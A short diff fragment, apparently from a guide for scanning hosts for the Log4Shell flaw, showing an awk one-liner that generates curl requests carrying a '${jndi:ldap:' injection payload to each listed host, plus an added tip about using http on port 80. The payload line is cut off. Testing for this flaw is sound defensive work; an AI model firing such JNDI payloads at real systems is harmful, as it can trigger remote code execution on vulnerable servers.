@@ -17,3 +17,5 @@ awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v https://"$1"?l=${jndi:ldap:
 
 
 Monitor the page in step 1 
+
+**Change to http if there are any websites running on port 80. 
